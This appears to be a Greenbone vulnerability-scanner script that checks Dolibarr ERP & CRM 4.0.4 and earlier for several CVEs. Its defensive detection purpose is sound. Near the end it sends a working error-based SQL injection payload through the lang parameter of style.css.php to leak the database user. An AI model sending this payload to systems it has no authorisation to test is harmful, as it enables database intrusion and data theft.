CPE = "cpe:/a:dolibarr:dolibarr";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108160" );
	script_version( "2021-09-15T08:01:41+0000" );
	script_cve_id( "CVE-2017-7886", "CVE-2017-7887", "CVE-2017-7888", "CVE-2017-8879" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-09-15 08:01:41 +0000 (Wed, 15 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-05-15 17:44:00 +0000 (Mon, 15 May 2017)" );
	script_tag( name: "creation_date", value: "2017-05-15 10:42:44 +0200 (Mon, 15 May 2017)" );
	script_name( "Dolibarr ERP & CRM <= 4.0.4 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dolibarr_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "dolibarr/detected" );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2017/q2/243" );
	script_xref( name: "URL", value: "https://www.foxmole.com/advisories/foxmole-2017-02-23.txt" );
	script_xref( name: "URL", value: "https://github.com/Dolibarr/dolibarr/issues/6504" );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site and to cause
  SQL Injection attacks to gain sensitive information." );
	script_tag( name: "affected", value: "Dolibarr version 4.0.4 is vulnerable. Other versions may also be affected." );
	script_tag( name: "insight", value: "Multiple flaws exist:

  - SQL Injection in /theme/eldy/style.css.php via the lang parameter.

  - XSS in /societe/list.php via the sall parameter.

  - storing of passwords with the MD5 algorithm, which makes brute-force attacks easier.

  - allowing password changes without supplying the current password, which makes it easier for
  physically proximate attackers to obtain access via an unattended workstation." );
	script_tag( name: "solution", value: "Upgrade to Dolibarr ERP/CRM version 4.0.7/5.0.3/6.0.0 or later." );
	script_tag( name: "summary", value: "This host is running Dolibarr ERP & CRM and is prone to multiple
vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "https://www.dolibarr.org" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/theme/eldy/style.css.php?lang=de%27%20procedure%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1)--%201";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "Latest database access request error:</b> SELECT transkey, transvalue FROM (.*)overwrite_trans where lang=" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

